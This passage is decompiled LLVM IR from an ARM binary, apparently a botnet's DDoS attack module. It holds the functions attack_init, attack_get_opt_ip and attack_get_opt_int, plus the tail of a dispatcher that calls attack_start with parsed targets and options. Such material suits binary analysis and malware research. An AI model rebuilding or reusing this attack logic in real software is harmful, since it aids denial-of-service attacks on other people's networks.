  br label %dec_label_pc_83c0

dec_label_pc_83c0:                                ; preds = %dec_label_pc_83c0, %dec_label_pc_83a0
  %v1_83c4 = phi i32 [ %v1_83f0, %dec_label_pc_83c0 ], [ %v2_83ac, %dec_label_pc_83a0 ]
  %v0_83c0 = phi i32 [ %v1_83ec, %dec_label_pc_83c0 ], [ %v1_83bc, %dec_label_pc_83a0 ]
  %v1_83c0 = add i32 %v0_83c0, -5
  %v2_83c0 = inttoptr i32 %v1_83c0 to i32*
  %v3_83c0 = load i32, i32* %v2_83c0, align 4
  store i32 %v3_83c0, i32* %r1.global-to-local, align 4
  %v2_83c4 = add i32 %v1_83c4, 16
  %v3_83c4 = inttoptr i32 %v2_83c4 to i32*
  store i32 %v3_83c0, i32* %v3_83c4, align 4
  %v0_83c8 = load i32, i32* @r7, align 4
  %v1_83c8 = add i32 %v0_83c8, -6
  store i32 %v1_83c8, i32* %r3.global-to-local, align 4
  %v0_83cc = load i32, i32* %r0.global-to-local, align 4
  %v1_83cc = add i32 %v0_83cc, -1
  %v2_83cc = inttoptr i32 %v1_83cc to i8*
  %v3_83cc = load i8, i8* %v2_83cc, align 1
  %v4_83cc = zext i8 %v3_83cc to i32
  store i32 %v4_83cc, i32* %r2.global-to-local, align 4
  %v0_83d0 = load i32, i32* @r6, align 4
  %v1_83d0 = add i32 %v0_83d0, -5
  store i32 %v1_83d0, i32* @r6, align 4
  %v9_83d4 = icmp eq i32 %v1_83d0, %v1_83c8
  store i1 %v9_83d4, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v0_83cc, i32* @r4, align 4
  %v2_83e0 = load i32, i32* %ip.global-to-local, align 4
  %v3_83e0 = add i32 %v2_83e0, 20
  %v4_83e0 = inttoptr i32 %v3_83e0 to i8*
  store i8 %v3_83cc, i8* %v4_83e0, align 1
  %v0_83e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_83e4 = load i32, i32* %ip.global-to-local, align 4
  %v2_83e4 = add i32 %v1_83e4, 4
  %v3_83e4 = inttoptr i32 %v2_83e4 to i32*
  store i32 %v0_83e4, i32* %v3_83e4, align 4
  %v0_83e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_83e8 = trunc i32 %v0_83e8 to i16
  %v2_83e8 = load i32, i32* %ip.global-to-local, align 4
  %v3_83e8 = inttoptr i32 %v2_83e8 to i16*
  store i16 %v1_83e8, i16* %v3_83e8, align 2
  %v0_83ec = load i32, i32* %r0.global-to-local, align 4
  %v1_83ec = add i32 %v0_83ec, 5
  store i32 %v1_83ec, i32* %r0.global-to-local, align 4
  %v0_83f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_83f0 = add i32 %v0_83f0, 24
  store i32 %v1_83f0, i32* %ip.global-to-local, align 4
  %v0_83f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_83f4, label %dec_label_pc_83f8, label %dec_label_pc_83c0

dec_label_pc_83f8:                                ; preds = %dec_label_pc_83c0
  %v0_83f8 = load i32, i32* @r6, align 4
  %v2_83f8 = icmp eq i32 %v0_83f8, 0
  store i1 %v2_83f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_83f8, label %dec_label_pc_84fc, label %dec_label_pc_8400

dec_label_pc_8400:                                ; preds = %dec_label_pc_83f8
  %v0_8400 = load i32, i32* @r4, align 4
  %v1_8400 = inttoptr i32 %v0_8400 to i8*
  %v2_8400 = load i8, i8* %v1_8400, align 1
  %v3_8400 = zext i8 %v2_8400 to i32
  store i32 %v3_8400, i32* @r5, align 4
  %v2_8404 = icmp eq i8 %v2_8400, 0
  store i1 %v2_8404, i1* %cpsr_z.global-to-local, align 1
  %v0_8408 = load i32, i32* @r7, align 4
  %v1_8408 = add i32 %v0_8408, -7
  store i32 %v1_8408, i32* @r8, align 4
  br i1 %v2_8404, label %bb, label %dec_label_pc_8414

bb:                                               ; preds = %dec_label_pc_8400
  store i32 %v3_8400, i32* @r6, align 4
  br label %dec_label_pc_84d8

dec_label_pc_8414:                                ; preds = %dec_label_pc_8400
  store i32 %v3_8400, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_841c = call i32 @calloc(i32 %v3_8400, i32 8)
  store i32 %v2_841c, i32* %r0.global-to-local, align 4
  %v0_8420 = load i32, i32* @r8, align 4
  %v2_8420 = icmp eq i32 %v0_8420, 0
  store i1 %v2_8420, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_841c, i32* @r6, align 4
  br i1 %v2_8420, label %dec_label_pc_84fc, label %dec_label_pc_842c

dec_label_pc_842c:                                ; preds = %dec_label_pc_8414
  %v0_842c = load i32, i32* @r4, align 4
  %v1_842c = add i32 %v0_842c, 1
  %v2_842c = inttoptr i32 %v1_842c to i8*
  %v3_842c = load i8, i8* %v2_842c, align 1
  %v0_8430 = load i32, i32* @r7, align 4
  %v7_8430 = icmp eq i32 %v0_8430, 8
  store i1 %v7_8430, i1* %cpsr_z.global-to-local, align 1
  %v3_8434 = add i32 %v2_841c, 4
  %v4_8434 = inttoptr i32 %v3_8434 to i8*
  store i8 %v3_842c, i8* %v4_8434, align 1
  %v0_8438 = load i32, i32* @r4, align 4
  %v1_8438 = add i32 %v0_8438, 1
  store i32 %v1_8438, i32* %r3.global-to-local, align 4
  %v0_843c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_843c, label %dec_label_pc_84fc, label %dec_label_pc_8440

dec_label_pc_8440:                                ; preds = %dec_label_pc_842c
  %v1_8440 = add i32 %v0_8438, 2
  %v2_8440 = inttoptr i32 %v1_8440 to i8*
  %v3_8440 = load i8, i8* %v2_8440, align 1
  %v4_8440 = zext i8 %v3_8440 to i32
  store i32 %v4_8440, i32* @r4, align 4
  %v0_8444 = load i32, i32* @r7, align 4
  %v1_8444 = add i32 %v0_8444, -9
  store i32 %v1_8444, i32* @r8, align 4
  %v9_8448 = icmp eq i32 %v1_8444, %v4_8440
  store i1 %v9_8448, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8440, i32* %r1.global-to-local, align 4
  %v5_8450 = icmp slt i32 %v1_8444, %v4_8440
  br i1 %v5_8450, label %dec_label_pc_84fc, label %bb35

bb35:                                             ; preds = %dec_label_pc_8440
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_84547 = add i32 %v0_8438, 3
  store i32 %v7_84547, i32* @r7, align 4
  %v6_8458 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_8458, i32* @sl, align 4
  br label %dec_label_pc_849c

dec_label_pc_8468:                                ; preds = %dec_label_pc_849c
  %v0_8468 = load i32, i32* @r8, align 4
  %v1_8468 = load i32, i32* @r4, align 4
  %v2_8468 = sub i32 %v0_8468, %v1_8468
  store i32 %v2_8468, i32* %r2.global-to-local, align 4
  %v9_8468 = icmp eq i32 %v0_8468, %v1_8468
  store i1 %v9_8468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8468, label %dec_label_pc_84fc, label %dec_label_pc_8470

dec_label_pc_8470:                                ; preds = %dec_label_pc_8468
  %v1_8470 = load i32, i32* @r7, align 4
  %v2_8470 = add i32 %v1_8470, %v1_8468
  %v3_8470 = inttoptr i32 %v2_8470 to i8*
  %v4_8470 = load i8, i8* %v3_8470, align 1
  store i32 %v2_8470, i32* %r0.global-to-local, align 4
  %v1_8478 = add i32 %v2_8468, -1
  store i32 %v1_8478, i32* %r2.global-to-local, align 4
  %v7_8478 = icmp eq i32 %v2_8468, 1
  store i1 %v7_8478, i1* %cpsr_z.global-to-local, align 1
  %v3_847c = add i32 %v2_84d0, 4
  %v4_847c = inttoptr i32 %v3_847c to i8*
  store i8 %v4_8470, i8* %v4_847c, align 1
  %v0_8480 = load i32, i32* %r0.global-to-local, align 4
  %v1_8480 = add i32 %v0_8480, 1
  store i32 %v1_8480, i32* %r3.global-to-local, align 4
  %v0_8484 = load i32, i32* %r2.global-to-local, align 4
  %v1_8484 = add i32 %v0_8484, -1
  store i32 %v1_8484, i32* @r8, align 4
  %v1_8488 = add i32 %v0_8480, 2
  store i32 %v1_8488, i32* @r7, align 4
  %v0_848c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_848c, label %dec_label_pc_84fc, label %dec_label_pc_8490

dec_label_pc_8490:                                ; preds = %dec_label_pc_8470
  %v2_8490 = inttoptr i32 %v1_8480 to i8*
  %v3_8490 = load i8, i8* %v2_8490, align 1
  %v4_8490 = zext i8 %v3_8490 to i32
  store i32 %v4_8490, i32* @r4, align 4
  %v2_8494 = sub i32 %v1_8484, %v4_8490
  %tmp36 = sub i32 0, %v2_8494
  %v6_8494 = and i32 %v1_8484, %tmp36
  %v7_8494 = icmp slt i32 %v6_8494, 0
  %v8_8494 = icmp slt i32 %v2_8494, 0
  %v9_8494 = icmp eq i32 %v1_8484, %v4_8490
  store i1 %v9_8494, i1* %cpsr_z.global-to-local, align 1
  %v2_8498 = xor i1 %v8_8494, %v7_8494
  br i1 %v2_8498, label %dec_label_pc_84fc, label %dec_label_pc_849c

dec_label_pc_849c:                                ; preds = %bb35, %dec_label_pc_8490
  %v0_84a0 = phi i32 [ %v4_8440, %bb35 ], [ %v4_8490, %dec_label_pc_8490 ]
  %stack_var_-48.1 = phi i32 [ 0, %bb35 ], [ %v1_84b0, %dec_label_pc_8490 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_84a0 = add nuw nsw i32 %v0_84a0, 1
  store i32 %v1_84a0, i32* %r0.global-to-local, align 4
  %v2_84a4 = call i32 @calloc(i32 %v1_84a0, i32 1)
  store i32 %v2_84a4, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-48.1, i32* %r3.global-to-local, align 4
  %v1_84ac = load i32, i32* @sl, align 4
  %v2_84ac = inttoptr i32 %v1_84ac to i32*
  store i32 %v2_84a4, i32* %v2_84ac, align 4
  %v0_84b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_84b0 = add i32 %v0_84b0, 1
  store i32 %v1_84b0, i32* %r3.global-to-local, align 4
  %v0_84b4 = load i32, i32* @r4, align 4
  store i32 %v0_84b4, i32* %r2.global-to-local, align 4
  %v0_84b8 = load i32, i32* @r7, align 4
  store i32 %v0_84b8, i32* %r1.global-to-local, align 4
  %v3_84c0 = call i32 @util_memcpy(i32 %v2_84a4, i32 %v0_84b8, i32 %v0_84b4)
  store i32 %v3_84c0, i32* %r0.global-to-local, align 4
  store i32 %v1_84b0, i32* %r2.global-to-local, align 4
  %v3_84c8 = mul i32 %v1_84b0, 8
  store i32 %v3_84c8, i32* %r3.global-to-local, align 4
  %v1_84cc = load i32, i32* @r5, align 4
  %v9_84cc = icmp eq i32 %v1_84b0, %v1_84cc
  store i1 %v9_84cc, i1* %cpsr_z.global-to-local, align 1
  %v0_84d0 = load i32, i32* @r6, align 4
  %v2_84d0 = add i32 %v0_84d0, %v3_84c8
  store i32 %v2_84d0, i32* @sl, align 4
  br i1 %v9_84cc, label %dec_label_pc_84d8, label %dec_label_pc_8468

dec_label_pc_84d8:                                ; preds = %dec_label_pc_849c, %bb
  %v0_84d8 = call i32 @__GI___errno_location()
  %v2_84e0 = inttoptr i32 %v0_84d8 to i32*
  store i32 0, i32* %v2_84e0, align 4
  store i32 %v4_8370, i32* %r1.global-to-local, align 4
  %v0_84e8 = load i32, i32* @fp, align 4
  store i32 %v0_84e8, i32* %r0.global-to-local, align 4
  %v0_84ec = load i32, i32* @sb, align 4
  store i32 %v0_84ec, i32* %r2.global-to-local, align 4
  store i32 %v2_83ac, i32* %r3.global-to-local, align 4
  %v2_84f4 = load i32, i32* @r5, align 4
  %v5_84f4 = load i32, i32* @r6, align 4
  %v6_84f8 = trunc i32 %v2_84f4 to i8
  %v7_84f8 = call i32 @attack_start(i32 %v0_84e8, i32 %v4_8370, i32 %v0_84ec, i32 %v2_83ac, i8 %v6_84f8, i32 %v5_84f4)
  store i32 %v7_84f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_84fc

dec_label_pc_84fc:                                ; preds = %dec_label_pc_8490, %dec_label_pc_8470, %dec_label_pc_8468, %dec_label_pc_8440, %dec_label_pc_842c, %dec_label_pc_8414, %dec_label_pc_83f8, %dec_label_pc_84d8
  store i32 %v2_83ac, i32* %r3.global-to-local, align 4
  %v2_8500 = icmp eq i32 %v2_83ac, 0
  store i1 %v2_8500, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8500, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_84fc
  store i32 %v2_83ac, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_84fc, %bb37
  store i32 34060, i32* @lr, align 4
  %v1_8508 = xor i1 %v2_8500, true
  call void @__pseudo_cond_branch(i1 %v1_8508, i32 ptrtoint (i32* @global_var_12874.33 to i32))
  %v0_850c = load i32, i32* @r6, align 4
  %v2_850c = icmp eq i32 %v0_850c, 0
  store i1 %v2_850c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_850c, label %.dec_label_pc_8340_crit_edge, label %dec_label_pc_8514

.dec_label_pc_8340_crit_edge:                     ; preds = %bb38
  %v1_8348.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8340

dec_label_pc_8514:                                ; preds = %bb38
  %v0_8514 = load i32, i32* @r5, align 4
  %v2_8514 = icmp eq i32 %v0_8514, 0
  store i1 %v2_8514, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8514, label %dec_label_pc_8538, label %dec_label_pc_851c

dec_label_pc_851c:                                ; preds = %dec_label_pc_8514
  br label %dec_label_pc_8520

dec_label_pc_8520:                                ; preds = %dec_label_pc_8520, %dec_label_pc_851c
  %v0_8528 = phi i32 [ 0, %dec_label_pc_851c ], [ %v1_8530, %dec_label_pc_8520 ]
  %v0_8520 = phi i32 [ %v0_850c, %dec_label_pc_851c ], [ %v0_8538.pre, %dec_label_pc_8520 ]
  %v4_8520 = mul i32 %v0_8528, 8
  %v5_8520 = add i32 %v4_8520, %v0_8520
  %v6_8520 = inttoptr i32 %v5_8520 to i32*
  %v7_8520 = load i32, i32* %v6_8520, align 4
  store i32 %v7_8520, i32* %r0.global-to-local, align 4
  %v2_8524 = icmp eq i32 %v7_8520, 0
  store i1 %v2_8524, i1* %cpsr_z.global-to-local, align 1
  %v1_8528 = add i32 %v0_8528, 1
  store i32 %v1_8528, i32* @r4, align 4
  store i32 34096, i32* @lr, align 4
  %v1_852c = xor i1 %v2_8524, true
  call void @__pseudo_cond_branch(i1 %v1_852c, i32 ptrtoint (i32* @global_var_12874.33 to i32))
  %v0_8530 = load i32, i32* @r5, align 4
  %v1_8530 = load i32, i32* @r4, align 4
  %v9_8530 = icmp eq i32 %v0_8530, %v1_8530
  store i1 %v9_8530, i1* %cpsr_z.global-to-local, align 1
  %v0_8538.pre = load i32, i32* @r6, align 4
  br i1 %v9_8530, label %dec_label_pc_8538, label %dec_label_pc_8520

dec_label_pc_8538:                                ; preds = %dec_label_pc_8520, %dec_label_pc_8514
  %v0_8538 = phi i32 [ %v0_850c, %dec_label_pc_8514 ], [ %v0_8538.pre, %dec_label_pc_8520 ]
  store i32 %v0_8538, i32* @r0, align 4
  %v0_853c = call i32 @free()
  store i32 %v0_853c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8340

; uselistorder directives
  uselistorder i32 %v0_853c, { 1, 0 }
  uselistorder i32 %v1_8530, { 1, 0 }
  uselistorder i1 %v2_8500, { 0, 2, 1 }
  uselistorder i32 %v2_84d0, { 1, 0 }
  uselistorder i32 %v3_84c8, { 1, 0 }
  uselistorder i32 %v1_84b0, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v2_8494, { 1, 0 }
  uselistorder i32 %v4_8490, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8484, { 2, 0, 1, 3 }
  uselistorder i32 %v3_8400, { 1, 0, 2, 3 }
  uselistorder i32 %v1_83f0, { 1, 0 }
  uselistorder i32 %v1_83ec, { 1, 0 }
  uselistorder i32 %v2_83ac, { 0, 4, 5, 2, 3, 1, 6 }
  uselistorder i32 %v4_8380, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8350, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_834c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_8338, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 4, 5, 6, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 6, 2, 3, 4, 0, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 17, 3, 6, 5, 9, 11, 10, 7, 8, 18, 19, 12, 13, 14, 15, 16, 20, 21, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_84fc, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_849c, { 1, 0 }
  uselistorder label %dec_label_pc_8340, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @attack_get_opt_ip(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_8544 = icmp eq i32 %arg1, 0
  %v3_8548 = load i32, i32* @r4, align 4
  store i32 %v3_8548, i32* %stack_var_-8, align 4
  %v6_8548 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_8544, label %dec_label_pc_858c, label %dec_label_pc_8554

dec_label_pc_8554:                                ; preds = %entry
  %v0_8554 = load i32, i32* %r1.global-to-local, align 4
  %v1_8554 = add i32 %v0_8554, 4
  %v2_8554 = inttoptr i32 %v1_8554 to i8*
  %v3_8554 = load i8, i8* %v2_8554, align 1
  %v4_8554 = zext i8 %v3_8554 to i32
  %v9_8558 = icmp eq i32 %v4_8554, %arg3
  br i1 %v9_8558, label %dec_label_pc_8598, label %dec_label_pc_857c.preheader

dec_label_pc_857c.preheader:                      ; preds = %dec_label_pc_8554
  br label %dec_label_pc_857c

dec_label_pc_856c:                                ; preds = %dec_label_pc_857c
  %v1_856c = add i32 %v0_8574.in, 12
  %v2_856c = inttoptr i32 %v1_856c to i8*
  %v3_856c = load i8, i8* %v2_856c, align 1
  %v4_856c = zext i8 %v3_856c to i32
  %v9_8570 = icmp eq i32 %v4_856c, %arg3
  br i1 %v9_8570, label %dec_label_pc_8598, label %dec_label_pc_857c

dec_label_pc_857c:                                ; preds = %dec_label_pc_857c.preheader, %dec_label_pc_856c
  %v0_8574.in = phi i32 [ %v0_8554, %dec_label_pc_857c.preheader ], [ %v0_8574, %dec_label_pc_856c ]
  %v0_857c = phi i32 [ 0, %dec_label_pc_857c.preheader ], [ %v1_857c, %dec_label_pc_856c ]
  %v0_8574 = add i32 %v0_8574.in, 8
  %v1_857c = add i32 %v0_857c, 1
  %v9_8580 = icmp eq i32 %v1_857c, %arg1
  store i32 %v0_8574, i32* %r1.global-to-local, align 4
  br i1 %v9_8580, label %dec_label_pc_858c, label %dec_label_pc_856c

dec_label_pc_858c:                                ; preds = %dec_label_pc_857c, %dec_label_pc_8598, %entry, %dec_label_pc_85a4
  %v2_8590 = phi i32 [ %v3_8548, %dec_label_pc_8598 ], [ %v3_8548, %entry ], [ %v2_8590.pre, %dec_label_pc_85a4 ], [ %v3_8548, %dec_label_pc_857c ]
  %v0_858c = phi i32 [ %arg4, %dec_label_pc_8598 ], [ %arg4, %entry ], [ %v1_85a4, %dec_label_pc_85a4 ], [ %arg4, %dec_label_pc_857c ]
  store i32 %v2_8590, i32* @r4, align 4
  store i32 %v6_8548, i32* @lr, align 4
  ret i32 %v0_858c

dec_label_pc_8598:                                ; preds = %dec_label_pc_856c, %dec_label_pc_8554
  %v0_8598 = phi i32 [ %v0_8554, %dec_label_pc_8554 ], [ %v0_8574, %dec_label_pc_856c ]
  %v1_8598 = inttoptr i32 %v0_8598 to i32*
  %v2_8598 = load i32, i32* %v1_8598, align 4
  store i32 %v2_8598, i32* @r0, align 4
  %v2_859c = icmp eq i32 %v2_8598, 0
  br i1 %v2_859c, label %dec_label_pc_858c, label %dec_label_pc_85a4

dec_label_pc_85a4:                                ; preds = %dec_label_pc_8598
  %v1_85a4 = call i32 @inet_addr(i32 %v2_8598)
  %v2_8590.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_858c

; uselistorder directives
  uselistorder i32 %v1_857c, { 1, 0 }
  uselistorder i32 %v0_8574, { 1, 0, 2 }
  uselistorder i32 %v0_8574.in, { 1, 0 }
  uselistorder i32 %v0_8554, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_858c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_857c, { 1, 0 }
}

define i32 @attack_get_opt_int(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_85b0 = icmp eq i32 %arg1, 0
  %v3_85b4 = load i32, i32* @r4, align 4
  store i32 %v3_85b4, i32* %stack_var_-8, align 4
  %v6_85b4 = load i32, i32* @lr, align 4
  br i1 %v2_85b0, label %dec_label_pc_85f8, label %dec_label_pc_85c0

dec_label_pc_85c0:                                ; preds = %entry
  %v0_85c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_85c0 = add i32 %v0_85c0, 4
  %v2_85c0 = inttoptr i32 %v1_85c0 to i8*
  %v3_85c0 = load i8, i8* %v2_85c0, align 1
  %v4_85c0 = zext i8 %v3_85c0 to i32
  %v9_85c4 = icmp eq i32 %v4_85c0, %arg3
  br i1 %v9_85c4, label %dec_label_pc_8604, label %dec_label_pc_85e8.preheader

dec_label_pc_85e8.preheader:                      ; preds = %dec_label_pc_85c0
  br label %dec_label_pc_85e8

dec_label_pc_85d8:                                ; preds = %dec_label_pc_85e8
  %v1_85d8 = add i32 %v0_85e0.in, 12
  %v2_85d8 = inttoptr i32 %v1_85d8 to i8*
  %v3_85d8 = load i8, i8* %v2_85d8, align 1
  %v4_85d8 = zext i8 %v3_85d8 to i32
  %v9_85dc = icmp eq i32 %v4_85d8, %arg3
  br i1 %v9_85dc, label %dec_label_pc_8604, label %dec_label_pc_85e8

dec_label_pc_85e8:                                ; preds = %dec_label_pc_85e8.preheader, %dec_label_pc_85d8
  %v0_85e0.in = phi i32 [ %v0_85c0, %dec_label_pc_85e8.preheader ], [ %v0_85e0, %dec_label_pc_85d8 ]
  %v0_85e8 = phi i32 [ 0, %dec_label_pc_85e8.preheader ], [ %v1_85e8, %dec_label_pc_85d8 ]
  %v0_85e0 = add i32 %v0_85e0.in, 8
  %v1_85e8 = add i32 %v0_85e8, 1
  %v9_85ec = icmp eq i32 %v1_85e8, %arg1
  store i32 %v0_85e0, i32* %r1.global-to-local, align 4
  br i1 %v9_85ec, label %dec_label_pc_85f8, label %dec_label_pc_85d8

dec_label_pc_85f8:                                ; preds = %dec_label_pc_85e8, %dec_label_pc_8604, %entry, %dec_label_pc_8610
  %v2_85fc = phi i32 [ %v3_85b4, %dec_label_pc_8604 ], [ %v3_85b4, %entry ], [ %v2_85fc.pre, %dec_label_pc_8610 ], [ %v3_85b4, %dec_label_pc_85e8 ]
  %v0_85f8 = phi i32 [ %arg4, %dec_label_pc_8604 ], [ %arg4, %entry ], [ %v3_8614, %dec_label_pc_8610 ], [ %arg4, %dec_label_pc_85e8 ]
  store i32 %v2_85fc, i32* @r4, align 4
  store i32 %v6_85b4, i32* @lr, align 4
  ret i32 %v0_85f8

dec_label_pc_8604:                                ; preds = %dec_label_pc_85d8, %dec_label_pc_85c0
  %v0_8604 = phi i32 [ %v0_85c0, %dec_label_pc_85c0 ], [ %v0_85e0, %dec_label_pc_85d8 ]
  %v1_8604 = inttoptr i32 %v0_8604 to i32*
  %v2_8604 = load i32, i32* %v1_8604, align 4
  %v2_8608 = icmp eq i32 %v2_8604, 0
  br i1 %v2_8608, label %dec_label_pc_85f8, label %dec_label_pc_8610

dec_label_pc_8610:                                ; preds = %dec_label_pc_8604
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_8614 = inttoptr i32 %v2_8604 to i8*
  %v3_8614 = call i32 @util_atoi(i8* %v2_8614, i32 10)
  %v2_85fc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_85f8

; uselistorder directives
  uselistorder i32 %v1_85e8, { 1, 0 }
  uselistorder i32 %v0_85e0, { 1, 0, 2 }
  uselistorder i32 %v0_85e0.in, { 1, 0 }
  uselistorder i32 %v0_85c0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_85f8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_85e8, { 1, 0 }
}

define i32 @attack_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_8620 = load i32, i32* @r4, align 4
  store i32 %v3_8620, i32* %stack_var_-24, align 4
  %v6_8620 = load i32, i32* @r5, align 4
  %v9_8620 = load i32, i32* @r6, align 4
  %v12_8620 = load i32, i32* @r7, align 4
  %v15_8620 = load i32, i32* @r8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_862c = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_216d0.28 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_216d4.30 to i32), i32* @r6, align 4
  store i32 36588, i32* %r2.global-to-local, align 4
  store i32 %v2_862c, i32* @r5, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_216d1.37 to i32), i32* %r1.global-to-local, align 4
  %v2_864c = load i32, i32* @global_var_216d4.30, align 4
  %v2_8650 = inttoptr i32 %v2_862c to i32*
  store i32 36588, i32* %v2_8650, align 4
  %v3_8654 = load i32, i32* @r5, align 4
  %v4_8654 = add i32 %v3_8654, 4
  %v5_8654 = inttoptr i32 %v4_8654 to i8*
  store i8 0, i8* %v5_8654, align 1
  %v0_8658 = load i32, i32* %r1.global-to-local, align 4
  %v3_8658 = mul i32 %v0_8658, 4
  store i32 %v3_8658, i32* %r1.global-to-local, align 4
  %v5_865c = inttoptr i32 %v2_864c to i32*
  %v6_865c = call i32 @realloc(i32* %v5_865c, i32 %v3_8658, i32 36588, i32 0)
  %v2_8660 = load i8, i8* bitcast (i8** @global_var_216d0.28 to i8*), align 4
  %v3_8660 = zext i8 %v2_8660 to i32
  store i32 %v6_865c, i32* %r2.global-to-local, align 4
  %v0_8668 = load i32, i32* @r5, align 4
  %v5_8668 = mul nuw nsw i32 %v3_8660, 4
  %v6_8668 = add i32 %v5_8668, %v6_865c
  %v7_8668 = inttoptr i32 %v6_8668 to i32*
  store i32 %v0_8668, i32* %v7_8668, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_216d1.37 to i32), i32* %r3.global-to-local, align 4
  %v1_8678 = load i32, i32* @r6, align 4
  %v2_8678 = inttoptr i32 %v1_8678 to i32*
  store i32 %v6_865c, i32* %v2_8678, align 4
  %v0_867c = load i32, i32* %r3.global-to-local, align 4
  %v1_867c = trunc i32 %v0_867c to i8
  %v2_867c = load i32, i32* @r4, align 4
  %v3_867c = inttoptr i32 %v2_867c to i8*
  store i8 %v1_867c, i8* %v3_867c, align 1
  %v2_8680 = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i32* @global_var_a088.39 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r8, align 4
  store i32 %v2_8680, i32* @r5, align 4
  store i32 ptrtoint (i8* @global_var_216d1.37 to i32), i32* %r1.global-to-local, align 4
  %v2_8698 = load i32, i32* @global_var_216d4.30, align 4
  %v2_869c = inttoptr i32 %v2_8680 to i32*
  store i32 ptrtoint (i32* @global_var_a088.39 to i32), i32* %v2_869c, align 4
  %v0_86a0 = load i32, i32* @r8, align 4
  %v1_86a0 = trunc i32 %v0_86a0 to i8
  %v2_86a0 = load i32, i32* @r5, align 4
  %v3_86a0 = add i32 %v2_86a0, 4
  %v4_86a0 = inttoptr i32 %v3_86a0 to i8*
  store i8 %v1_86a0, i8* %v4_86a0, align 1
  %v0_86a4 = load i32, i32* %r1.global-to-local, align 4
  %v3_86a4 = mul i32 %v0_86a4, 4
  store i32 %v3_86a4, i32* %r1.global-to-local, align 4
  %v4_86a8 = inttoptr i32 %v2_8698 to i32*
  %v5_86a8 = call i32 @realloc(i32* %v4_86a8, i32 %v3_86a4, i32 %v6_865c, i32 ptrtoint (i32* @global_var_a088.39 to i32))
  %v2_86ac = load i8, i8* bitcast (i8** @global_var_216d0.28 to i8*), align 4
  %v3_86ac = zext i8 %v2_86ac to i32
  store i32 %v3_86ac, i32* %r3.global-to-local, align 4
  store i32 %v5_86a8, i32* %r2.global-to-local, align 4
  %v0_86b4 = load i32, i32* @r5, align 4
  %v5_86b4 = mul nuw nsw i32 %v3_86ac, 4
